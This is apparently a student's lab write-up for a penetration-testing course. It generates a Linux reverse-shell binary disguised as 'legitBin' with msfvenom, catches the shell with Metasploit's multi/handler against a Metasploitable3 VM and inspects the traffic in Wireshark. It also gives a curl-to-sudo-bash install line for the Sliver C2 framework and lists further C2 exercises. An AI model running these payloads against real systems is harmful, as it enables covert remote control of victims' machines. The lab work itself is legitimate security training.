# A) Venom
**Objective**
- Create malware using msfvenom that spins up a reverse shell
- Accept the connection using metasploits multi/handler


## What's msfvenom?
A payload generator and encoder
- Source: msfvenom man pages

## Target
`metasploitable3` is todays victim:
```console
$ vagrant up ub1404
```
More on ms3 [here](<https://github.com/rapid7/metasploitable3>). And here is how I [set it up](<https://github.com/Ali-Mikael/Pen-testing/blob/main/h3-EternalExploit.md#setting-up>).


## ReverC 🐚
Start up the Kali VM and straight to man pages:
```bash
$ man msfvenom
```

I got the basic idea but didn't know which output format to use, so we do:
```bash
$ msfvenom --list formats
```

Then craft the payload:
```bash
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.130.233 LPORT=4040 -f elf -o legitBin

# Make the binary/payload executable:
$ chmod +x legitBin
```
Flags explained:
- `-p`: Payload to use `linux/x86/shell_reverse_tcp`
- `-f`: Output format `elf`
  - elf a.k.a Executable & Linkable Format is a binary format which can be executed on the system 
- `-o`: Output file `name_of_the_file`

> [!TIP]
> Use tab completion to your advantage. For example, after specifying the platform `linux/` (in this case), press tab a few times to get all the available options!


In `msfconsole` we use the `multi/handler` module to set up a listener:
```console
$ sudo msfconsole
msf > use exploit/multi/handler
    > options
    > set LHOST 192.168.130.233
    > set LPORT 4040
    > set payload linux/x86/shell_reverse_tcp    # <-- Match the payload
    > run
[*] Started reverse TCP handler on 192.168.130.233:4040 
```
Now that the listener is running we can execute the payload on the victims machine to get a reverse shell.


Get the ip of the victim:
```bash
$ sudo nmap -sn -T4 192.168.130.0/24

Nmap scan report for metasploitable3-ub1404 (192.168.130.202)
Host is up
```



Drop the payload:
```bash
$ rsync -av legitBin vagrant@192.168.130.202:/home/vagrant/
```
I'm using `rsync` to send it over via SSH, let's use our imagination here and say we sent the victim a link which it clicked and downloaded & executed the binary.

<img width="876" height="169" alt="2026-04-30-16:27:06" src="https://github.com/user-attachments/assets/a0d66341-2b3f-481e-ac20-f9e65f27a20c" />

The attacker now has a reverse shell:
<img width="1793" height="769" alt="2026-04-30-16:26:39" src="https://github.com/user-attachments/assets/e94a33e8-4162-482c-bbe6-40db9c8a2847" />



# B) Sniff venom
**Objective**
- Inspect and analyze the reverse shell connection using a packet sniffer such as Wireshark
  - What do you observe?
  - What makes the connection detectable?
  - How would one obscure the detection?
 

## Eavesdropping
I started packet capturing on the attackers interface `eth1` using Wireshark.

We can inspect the data being exchanged more closely by right clicking on one of the packets, then --> `Follow` and lastly --> `TCP Stream`.

`Red` is the attacker and `blue` is the response from the victim:

<img width="1394" height="846" alt="2026-04-30-16:56:30" src="https://github.com/user-attachments/assets/42c6299b-4d5b-49e3-9de1-25c858181a74" />

Talk about red team / blue team...

This makes it obvious that somebody is connected to the machine and executing shell commands. One could obscure it by encrypting the traffic for example!




# C) Hello Sliver
**Objective**
- Show an example of an HTTP-connection using Sliver

## What sliver?
"A powerful command and control framework designed to provide advanced capabilities for covertly managing and controlling remote systems"
- [Source](<https://sliver.sh/>)


## Install on kali:
```bash
$ sudo apt update && sudo apt install sliver -y
# OR
$ curl https://sliver.sh/install | sudo bash
```




# D) Sniff Sliver
**Objective**
- Inspect the Sliver http-connection usin a packet sniffer
  - What do you observe?
  - What makes the connection detectable?
 

# E) Hiding in plain sight
**Objective**
- One can modify the connection details using Sliver
- Try and show an example
- Showcase that it works


# F) Multitalent
**Objective**
- Sliver is good for a lot
- Show examples of some of it's features



# I) Bonus: Veil
**Objective**
- Try out Veil


# J) Bonus: ScareCrow
**Objective**
- Try out ScareCrow

# K) Bonus: PoshC2
**Objective**
- Create malware that executes a reverse shell using PoshC2



# L) Bonus: Mythic
**Objective**
- Create malware that executes a reverse shell using Mythic
